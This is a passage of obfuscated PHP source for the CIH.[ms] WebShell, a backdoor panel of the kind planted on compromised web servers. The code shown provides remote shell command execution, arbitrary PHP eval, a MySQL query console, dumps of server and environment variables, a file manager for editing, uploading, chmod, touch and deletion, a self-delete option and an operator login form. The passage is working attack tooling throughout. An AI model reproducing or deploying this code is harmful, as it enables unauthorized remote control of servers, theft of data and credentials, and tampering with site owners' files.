mysql_error($sp95ae53); if ($spd7253e == 'Query was empty') { break; } echo '<div class=\'str\' style=\'border-top:1px solid #333; \'>query # <b>' . $spc71a09 . '</b>:' . htmlspecialchars($sp8cac4d) . '</div>'; if ($spd7253e) { notice('Error : <b>' . $spd7253e . '</b>'); } else { if (is_array($sp305b9c)) { echo '<table style="width:100%; background:#222;">'; if (is_array($sp305b9c[0])) { echo '<tr style=\'background:#292929; font-size:10px;\'>'; foreach ($sp305b9c[0] as $sp5c3411 => $sp6d4391) { echo "<td style='padding:5px;'><b>{$sp5c3411}</b></td>"; } echo '</tr>'; } foreach ($sp305b9c as $spd09f64) { echo '<tr style=\'background:#232323;\'>'; if (is_array($spd09f64)) { foreach ($spd09f64 as $sp5c3411 => $sp6d4391) { echo "<td class='my'>{$sp6d4391}</td>"; } } else { echo "<td class='file'>{$spd09f64}</td>"; } echo '</tr>'; } echo '</table>'; } else { echo $sp305b9c; } if (($sp5183f2 = mysql_affected_rows($sp95ae53)) >= 0) { echo '<div class=\'str\' style=\'margin-top:3px; border-bottom:1px solid #333; padding:3px;\'>affected rows : <b>' . $sp5183f2 . '</b></div>'; } } } mysql_close($sp95ae53); } else { notice('Error: Could not connect to database..'); } echo '</div>'; } echo '<form action=\'\' method=\'post\' style=\'margin:0px; margin-top:15px;\'>
<table style=\'width:100%; height:40%\'><tr><td valign=\'top\' style=\'background:#272727; padding:3px;\'><textarea  class=\'txt\' cols=\'70\' rows=\'15\' name=\'sql\' style=\'width:100%; height:99%\'>'; if (isset($_POST['sql'])) { echo $_POST['sql']; } else { echo 'SHOW DATABASES;'; } echo "</textarea></td><td style='width:150px; background:#272727;' valign='top' >\n<input type='text' name='mysqlw_host' class='txt' style='margin:10px; height:24px;' value='{$sp342aef}'/><input type='text' name='mysqlw_db'  class='txt' style='margin:10px; height:24px;'  value='{$sp50c961}'/><input type='text' name='mysqlw_login' class='txt' style='margin:10px; height:24px;'  value='{$spbfb18a}'/><input type='txt' name='mysqlw_passw'  class='txt' style='margin:10px; height:24px;'  value='{$spc9e959}'/><input type='text' name='mysqlw_port'  class='txt' style='margin:10px; height:24px;'  value='{$spb97ae1}'/><br/></td><tr><td colspan=2 valign='top' style='height:5%;'><input type='hidden' name='do' value='mysql'><input type='submit' class='txt' style='width:100%; margin:0px; margin-bottom:5px; ' value='go!'></td></tr></table></form><br/>"; do_footer($sp7c6a43); die; break; case 'server': echo '<table class="str" style="width:100%">'; foreach ($_SERVER as $sp8db113 => $sp6d4391) { echo "<tr style='background:#262626; color:#666'><td style='padding:3px;'><b>{$sp8db113}</b></td><td>{$sp6d4391}</td></tr>"; } echo '</table>'; do_footer($sp7c6a43); die; break; case 'envinfo': echo '<table class="str" style=" width:100%">'; foreach ($_ENV as $sp8db113 => $sp6d4391) { echo "<tr style='background:#262626; color:#666'><td style='padding:3px;'><b>{$sp8db113}</b></td><td style='padding:3px;'>{$sp6d4391}</td></tr>"; } echo '</table><br/>'; do_footer($sp7c6a43); die; break; case 'delete': if (unlink(substr(strrchr($_SERVER['PHP_SELF'], '/'), 1)) == true) { echo '<div class=\'notice\'>cihshell has been deleted successfully..bye-bye ): </div><br/><br/>'; do_footer($sp7c6a43); } else { error('Unable to delete shell', $sp7c6a43); } die; break; case 'eval': echo '<form method=\'post\' action=\'\' style=\'padding:0px; margin-top:5px;\'><input type=\'hidden\' name=\'do\' value=\'eval\'  style=\'border-bottom:1px solid #444;\'> <textarea  name=\'eval\' class=\'form\' style=\'height:100px;\'>'; if (isset($_POST['eval'])) { echo $_POST['eval']; } else { echo 'code here (:'; } echo '</textarea><input type=\'submit\' class=\'form\' value=\'do\' style=\'width:98%; margin-top:3px; border:0px; background:#262626;\'></form><br/>'; if (isset($_POST['eval'])) { echo '<table  class=\'txt\'  style=\'margin-left:13px; width:98%; height:60%\'><tr><td valign=\'top\'>'; code_eval(); echo '</td></tr></table><br/>'; } do_footer($sp7c6a43); die; break; case 'shell': echo ' <textarea class=\'txt\'  style=\'width:98%; height:60%; background:#262626\' rows=\'30\'>'; if ($spdda14d == 'On') { echo 'Safe mode is on..'; } if (isset($_POST['alias'])) { foreach ($spede532 as $sp8db113 => $sp6d4391) { if ($_POST['alias'] == $sp8db113) { cmd_exec($sp6d4391); } } } else { cmd_exec($spdda14d); } if (isset($_POST['cmdir'])) { $sp2c35d0 = $_POST['cmdir']; } else { $sp2c35d0 = $sp149c6d; } echo '</textarea>'; echo '<form method=\'post\' action=\'\' style=\'padding:0px; margin-top:5px; margin-bottom:15px;\'><input type=\'hidden\' name=\'do\' value=\'shell\'><input type=\'text\'  name=\'cmd\' value=\''; if (isset($_POST['cmd'])) { echo $_POST['cmd']; } elseif ($sp6050b9 == 'win') { echo 'dir'; } else { echo 'ls'; } echo "'  class='form' style='width:98%; margin-bottom:2px;'><input type='text'  name='cmdir' value='{$sp2c35d0}'  class='form' style='color:#444;width:98%'><input type='submit' class='form' value='do' style='width:98%; margin-top:3px; border:0px; background:#262626;'></form>"; echo '<form method=\'post\' action=\'\' style=\'border-top:1px solid #282828; margin:0px;\'><select name=\'alias\' class=\'form\' style=\'width:98%; margin-top:5px;\'>'; foreach ($spede532 as $sp8db113 => $sp6d4391) { echo "<option>{$sp8db113}</option>"; } echo "</select><input type='hidden' name='do' value='shell'><input type='hidden' name='cmdir' value='{$sp2c35d0}'><input type='submit' class='form' value='do' style='width:98%; margin-top:3px; border:0px; background:#262626;'</form><br/><br/>"; do_footer($sp7c6a43); die; break; case 'cihshell': echo "<div class='str' style='text-align:center;'><table class='str' style='width:100%'><tr>\n<td style='border-right:1px solid #333; width:200px;'><div style=' padding:50px; margin-top:50px; margin-bottom:50px; border-top:1px solid #333; border-bottom:1px solid #333;'>Coded by <b>Berkut</b>. <br/><br/>&copy; 2007 <br/><hr>Fixed by <b>DCRM</b>. <br/></br>&copy; 2008 <br/></div></td><td valign='top' style='padding-left:30px;'><br/><br/><span style='font-size:20px; color:#666;'>CIH.[ms] WebShell<sup style='font-size:12px; color:#444;'>&nbsp;v.{$sp7c6a43}</sup></span><br/><br/><br/>It has so many strong points that it is impossible to write them here (:</td></tr></table></div>"; do_footer($sp7c6a43); die; break; default: error('There is no such function', $sp7c6a43); break; } } if (is_file($sp149c6d)) { $spce0b8c = fperms($sp149c6d); $spbb5bfd = filesize($sp149c6d . '/' . $sp7ff75d); $spbb5bfd = conv_size($spbb5bfd); $spba7bc3 = conv_size(filesize($sp149c6d)); $spb4c55b = $_POST['f_path']; $sp90a119 = $_POST['f_file']; echo "<div  style='padding:2px;'><div style='background:#292929; padding:10px; margin-bottom:3px; text-align:left;'><b>File actions</b></div><div style='background:#272727; padding:3px;  font-size:9px; text-align:left;'>file:&nbsp;<span style='color:#666;'>{$sp149c6d}</span>&nbsp;&nbsp;|&nbsp;&nbsp; permissions: <b style='color:#666;'>{$spce0b8c} </b>&nbsp;&nbsp;|&nbsp;&nbsp; size: <span style='color:#666;'>{$spba7bc3}</span>&nbsp;&nbsp;|&nbsp;&nbsp; Create time: <span style='color:#666;'>" . date('d.m.Y H:i:s', filectime($sp149c6d)) . '</span>&nbsp;&nbsp;|&nbsp;&nbsp;Modify time: <span style=\'color:#666;\'>' . date('d.m.Y H:i:s', filemtime($sp149c6d)) . "</span></div><table style='width:100%; font-size:10px;'><tr><td style='width:200px; border-right:1px solid #292929; vertical-align:top; padding:0px; padding-left:5px;'>      <form method='post' action=''><input type='hidden' name='ffile' value='{$sp149c6d}'><input type='hidden' name='path' value='{$sp149c6d}'><input type='hidden' name='curpath' value='{$spb4c55b}'><input type='hidden' name='filename' value='{$sp90a119}'><div style='width:200px; border-top:1px solid #292929;  border-bottom:1px solid #292929;  text-align:center; margin-top:5px;'>      <input type='submit' class='fa' name='fdo' value='view' style=''></div><div style='width:200px; border-top:1px solid #292929;  border-bottom:1px solid #292929;  text-align:center; margin-top:5px;'><input type='submit' class='fa' name='fdo' value='view in HEX' style=''></div>       <div style='width:200px; border-top:1px solid #292929;  border-bottom:1px solid #292929; text-align:center; margin-top:5px;'>      <input type='submit' class='fa' name='fdo' value='edit'></div>       <div style='width:200px; border-top:1px solid #292929;  border-bottom:1px solid #292929;  text-align:center; margin-top:5px;'>      <input type='submit' class='fa' name='fdo' value='preview' ></div><div style='width:200px; border-top:1px solid #292929;  border-bottom:1px solid #292929;  text-align:center; margin-top:5px;'><input type='submit' class='fa' name='fdo' value='download'></div><div style='width:200px; border-top:1px solid #292929;  border-bottom:1px solid #292929;  text-align:center; margin-top:40px;'><input type='submit' class='fa1' name='fdo' value='delete'></div><div style='width:200px; border-top:1px solid #292929;  border-bottom:1px solid #292929;  text-align:center; margin-top:5px;'>      <input type='submit' class='fa1' name='fdo' value='copy' ></div><div style='width:200px; border-top:1px solid #292929;  border-bottom:1px solid #292929;  text-align:center; margin-top:5px;'><input type='submit' class='fa1' name='fdo' value='rename' ></div> <div style='width:200px; border-top:1px solid #292929;  border-bottom:1px solid #292929;  text-align:center; margin-top:5px;'><input type='submit' class='fa1' name='fdo' value='chmod' ></div> <div style='width:200px; border-top:1px solid #292929;  border-bottom:1px solid #292929;  text-align:center; margin-top:5px;'><input type='submit' class='fa1' name='fdo' value='touch' ></div></td><td style='padding:3px; vertical-align:top;'>"; if (isset($_POST['fdo']) && isset($_POST['ffile'])) { $sp7132ba = $_POST['ffile']; switch ($_POST['fdo']) { case 'view': fileread2($sp7132ba, $spef32e0); break; case 'view in HEX': $spf728ed = fopen($sp149c6d, 'rb'); if ($spf728ed) { $sp1ae2ba = fread($spf728ed, filesize($sp149c6d)); $sp5c3411 = 0; $spbc558f = '00000000<br/>'; $sp407f5e = ''; $sp938ca1 = ''; for ($sp412bbc = 0; $sp412bbc < strlen($sp1ae2ba); $sp412bbc++) { $sp407f5e .= sprintf('%02X', ord($sp1ae2ba[$sp412bbc])) . ' '; switch (ord($sp1ae2ba[$sp412bbc])) { case 0: $sp938ca1 .= '0'; break; case 32: case 10: case 13: $sp938ca1 .= '&nbsp;'; break; default: $sp938ca1 .= htmlspecialchars($sp1ae2ba[$sp412bbc]); } $sp5c3411++; if ($sp5c3411 == $sp25e48e) { $sp5c3411 = 0; if ($sp412bbc + 1 < strlen($sp1ae2ba)) { $spbc558f .= sprintf('%08X', $sp412bbc + 1) . '<br>'; } $sp407f5e .= '<br>'; $sp938ca1 .= '<br>'; } } echo "<table style='font-size:10px;'><tr><td style='border-right:1px solid #292929; color:#444; padding:4px;'>{$spbc558f}</td><td style='color:#666; padding:4px;'>{$sp407f5e}</td><td style='border-left:1px solid #292929; color:#444; padding:4px;'>{$sp938ca1}</td></tr>"; echo '</table>'; } break; case 'edit': echo '<form method=\'post\' action=\'\' style=\'margin:0px; padding:0px;\'><textarea cols=\'170\' rows=\'34\' class=\'txt\' style=\'width:100%;\' name=\'wrcont\'> '; fileread($sp7132ba); echo "</textarea><input type='hidden' name='ffile' value='{$sp7132ba}'><input type='hidden' name='path' value='" . $sp149c6d . '\'><input type=\'submit\' name=\'wrfile\' class=\'form\' value=\'save file\' style=\'width:100%; margin-top:5px;\'></form><br/>'; break; case 'chmod': echo '<form method=\'post\' action=\'\' style=\'padding:0px; margin:0px;\'><input type=\'hidden\' name=\'path\' value=\'' . $_POST['curpath'] . '\'><input type=\'text\' name=\'chmod\' class=\'form\'  value=\'' . substr(sprintf('%o', fileperms($sp149c6d)), -4) . '\' style=\'width:10%\'><span style=\'margin-left:4px; margin-right:4px;\'>for</span><input type=\'text\' name=\'ffile\' class=\'form\'  value=\'' . $sp149c6d . '\' style=\'width:70%\'><input type=\'submit\' style=\'width:60px;\' class=\'form\' value=\'change!\'></form><br/>'; break; case 'touch': echo '<form method=\'post\' action=\'\' style=\'padding:0px; margin:0px;\'><input type=\'hidden\' name=\'path\' value=\'' . $_POST['curpath'] . '\'><input type=\'text\' name=\'touch\' class=\'form\'  value=\'' . date('d M Y H:i:s', filemtime($sp149c6d)) . '\' style=\'width:15%\'><span style=\'margin-left:4px; margin-right:4px;\'>for</span><input type=\'text\' name=\'ffile\' class=\'form\'  value=\'' . $sp149c6d . '\' style=\'width:70%\'><input type=\'submit\' style=\'width:60px;\' class=\'form\' value=\'change!\'></form><br/>'; break; case 'rename': echo ' <form method=\'post\' action=\'\'  style=\'padding:0px; margin:0px;\'><input type=\'hidden\' name=\'path\' value=\'' . $_POST['curpath'] . '\'><input type=\'text\' name=\'ffile\' class=\'form\'  value=\'' . $sp149c6d . '\' style=\'width:40%\'><span style=\'margin-left:4px; margin-right:4px;\'>to</span><input type=\'text\' name=\'newname\' class=\'form\'  value=\'' . $sp149c6d . '\'  style=\'width:40%\'><input type=\'submit\' style=\'width:60px;\' class=\'form\' value=\'rename!\'></form><br/>'; break; case 'copy': echo '<form method=\'post\' action=\'\'  style=\'padding:0px; margin:0px;\'><input type=\'hidden\' name=\'path\' value=\'' . $_POST['curpath'] . '\'><input type=\'text\' name=\'ffile\' class=\'form\'  value=\'' . $sp149c6d . '\' style=\'width:40%\'><span style=\'margin-left:4px; margin-right:4px;\'>to</span><input type=\'text\' name=\'newpath\' class=\'form\'  value=\'' . $sp149c6d . '\'  style=\'width:40%\'><input type=\'submit\' style=\'width:60px;\' class=\'form\' value=\'copy!\'></form><br/>'; break; } } else { $sp4f87f9 = fopen($sp149c6d, 'r'); if (!$sp4f87f9) { error('Could not open file', $sp7c6a43); } echo '<table style="font-size:10px;   width:100%; background:#222; ">'; if ($spef32e0) { $sp412bbc = 1; while (!feof($sp4f87f9) & $sp412bbc <= 30) { $sp47b792 = fgets($sp4f87f9); echo '<tr style="background:#242424;"><td style="text-align:center;padding:3px; width:2%; border-right:1px solid #2e2e2e; color:#444;">' . $sp412bbc . '</td><td>' . htmlspecialchars($sp47b792) . '</td></tr>'; $sp412bbc++; } } else { while (!feof($sp4f87f9) & $sp412bbc <= 30) { $sp47b792 = fgets($sp4f87f9); echo '<tr style="background:#242424;"><td>' . htmlspecialchars($sp47b792) . '</td></tr>'; } } echo '</table>'; } echo '</td></tr></table></div>'; do_footer($sp7c6a43); die; } elseif (is_dir($sp149c6d)) { $sp495c2d = array(); $spf2bff7 = array(); $spee51b5 = opendir($sp149c6d); while (($sp7ff75d = readdir($spee51b5)) !== false) { if ($sp7ff75d == '.' || $sp7ff75d == '..') { continue; } if (is_dir("{$sp149c6d}/{$sp7ff75d}")) { $sp495c2d[] = $sp7ff75d; } else { $spf2bff7[] = $sp7ff75d; } } closedir($spee51b5); } else { error('it isn\'t a directory', $sp7c6a43); } if (!$spee51b5) { error('An error occured while opening directory&nbsp;' . $sp149c6d, $sp7c6a43); } sort($sp495c2d); sort($spf2bff7); echo '<table style=\'width:100%; background:#222;\'>'; echo '<tr><td colspan=6 class=\'filet\' style=\'background:#282828; padding:0px; border-top:1px solid #2e2e2e; height:30px;\'>'; if ($sp6050b9 == 'win') { echo '<form method=\'post\' action=\'\' style=\'padding:0px; margin:0px; float:left;\'>'; echo '<input type=\'button\' value=\'Drives:\' class=\'fm\' style=\'font-weight:bold;\'>'; for ($sp96625c = 'c'; $sp96625c <= 'z'; $sp96625c++) { if (is_dir($sp96625c . ':/')) { echo '<input type=\'submit\' value=\'' . $sp96625c . ':/\' class=\'fm\' name=\'path\'>'; } } echo '</form>'; } echo '<form method=\'post\' action=\'\' style=\'padding:0px; margin:0px; float:right;\' >'; echo "<input type='submit' name='diract' class='fm' value='directory actions' style='margin-bottom:0px; font-weight:bold; color:#666;'><input type='hidden' name='curdir' value='{$sp149c6d}'><input type='hidden' name='cmdir' value='{$sp149c6d}'><span style='color:#666;'>|</span><input type='submit' name='fileact'   value='New File' class='fm'><span style='color:#666;'>|</span><input type='submit'  style='margin:0px;' name='fileact' value='New Dir' class='fm'><span style='color:#666;'>|</span><input type='submit' name='fileact' value='Upload' class='fm'>"; echo '</form>'; echo '</td></tr>'; echo '<tr style=\'background:#272727;\'><td  style=\'width:3%; \'>&nbsp;</td><td style=\'width:300px; color:#888;\' class=\'filet\'><b>name</b></td><td class=\'filet\' style=\'color:#888;\'><b>size</b></td><td class=\'filet\' style=\'color:#888;\'><b>last modified</b></td><td class=\'filet\' style=\'color:#888;\'><b>permissions</b></td></tr>'; echo "<form method='post' action=''><input type='hidden' name='f_path' value='{$sp149c6d}'>"; for ($sp412bbc = 0; $sp412bbc < count($sp495c2d); $sp412bbc++) { $spbb5bfd = '---'; $spce0b8c = fperms($sp149c6d . '/' . $sp495c2d[$sp412bbc]); $sp2c9daf = '<b>dir</b>'; $sp3b8492 = date('d.m.y  H:i:s', fileatime($sp149c6d . '/' . $sp7ff75d)); if (!$sp3b8492) { $sp3b8492 = '---'; } echo " <tr style='background:#252525;'><td  class='ico'>[{$sp2c9daf}]</td><td style='width:300px;'><input type='submit' name='f_file' class='dir' value='{$sp495c2d[$sp412bbc]}'></td><td class='filet'>{$spbb5bfd}</td><td class='filet'>{$sp3b8492}</td><td class='filet'>{$spce0b8c} </td></tr>"; } for ($sp412bbc = 0; $sp412bbc < count($spf2bff7); $sp412bbc++) { if (is_link($sp149c6d . '/' . $spf2bff7[$sp412bbc])) { $spbb5bfd = '---'; } else { $spbb5bfd = filesize($sp149c6d . '/' . $spf2bff7[$sp412bbc]); $spbb5bfd = conv_size($spbb5bfd); if ($spbb5bfd == '0B') { $spbb5bfd = '---'; } } $sp3b8492 = date('d.m.y  H:i:s', fileatime($sp149c6d . '/' . $spf2bff7[$sp412bbc])); if (!$sp3b8492) { $sp3b8492 = '---'; } $spce0b8c = fperms($sp149c6d . '/' . $spf2bff7[$sp412bbc]); $sp2c9daf = ''; if (is_link($sp149c6d . '/' . $spf2bff7[$sp412bbc])) { $sp2c9daf = 'link'; } else { $sp379b16 = array('php' => array('php', 'phtml', 'php3', 'php4', 'inc'), 'exe' => array('sh', 'install', 'bat', 'cmd'), 'ini' => array('ini', 'inf'), 'html' => array('html', 'htm', 'shtml'), 'txt' => array('txt', 'conf', 'bat', 'sh', 'js', 'bak', 'doc', 'log', 'sfc', 'cfg'), 'code' => array('tcl', 'h', 'c', 'cpp', 'pl', 'cgi'), 'img' => array('gif', 'png', 'jpeg', 'jpg', 'jpe', 'bmp', 'ico', 'tif', 'tiff', 'avi', 'mpg', 'mpeg'), 'sdb' => array('sdb'), 'sess' => array('sess'), 'dwnld' => array('exe', 'com', 'pif', 'src', 'lnk', 'zip', 'rar')); $spcc5ae4 = $spf2bff7[$sp412bbc]; $sp6d6a7e = explode('.', $spcc5ae4); $sp559d1c = count($sp6d6a7e) - 1; $sp6d6a7e = $sp6d6a7e[$sp559d1c]; $sp6d6a7e = strtolower($sp6d6a7e); $sp5dee70 = ''; foreach ($sp379b16 as $sp7ac89e => $sp8e17b7) { if (in_array($sp6d6a7e, $sp8e17b7)) { $sp2c9daf = $sp7ac89e; break; } } if ($sp2c9daf == '') { $sp2c9daf = 'none'; } } $sp558589 = '/' . $spf2bff7[$sp412bbc]; if ($sp558589 == $_SERVER['SCRIPT_NAME']) { echo "<tr style='background:#292929;'><td  class='ico' style='color:#666;'>[shell]</td><td style='width:300px;'><input type='submit' style='background:#292929;' name='f_file' class='file' value='{$spf2bff7[$sp412bbc]}'></td><td class='filet'>{$spbb5bfd}</td><td class='filet'>{$sp3b8492}</td><td class='filet'>{$spce0b8c} </td></tr>"; } else { echo "<tr style='background:#252525;'><td  class='ico'>[{$sp2c9daf}]</td><td style='width:300px;'><input type='submit' name='f_file'  class='file' value='{$spf2bff7[$sp412bbc]}'></td><td class='filet'>{$spbb5bfd}</td><td class='filet'>{$sp3b8492}</td><td class='filet'>{$spce0b8c} </td></tr>"; } } echo '</form></table><div style="padding-left:2px; padding-right:2px; padding-bottom:4px; background:#222;"><div class="filet" style="background:#272727; border-bottom:1px solid #2e2e2e">&nbsp</div></div>'; do_footer($sp7c6a43); } else { echo ' <html><head><style>body{background:#333;}</style><title>login </title></head><body><table style="margin-left:100px; margin-top:100px; background:#222; font-family:Verdana; font-size:10px; color:#999; padding:4px; width:100%:"><tr><td><form method="post" style="margin:0px; padding:)px;">login: <input type="text" name="login" style="color:#999; border:1px solid #333; font-size:10px; background:#292929; padding:2px;">&nbsp;password: <input type="text" name="password" style="color:#999; border:1px solid #333; font-size:10px; background:#292929; padding:2px;">&nbsp;<input type="submit"  style="color:#999; border:0px; font-size:10px; background:#262626; height:20px;; font-family:Verdana;" value="go"></form></td></tr></table></body></html>'; } echo '[syslog]05
';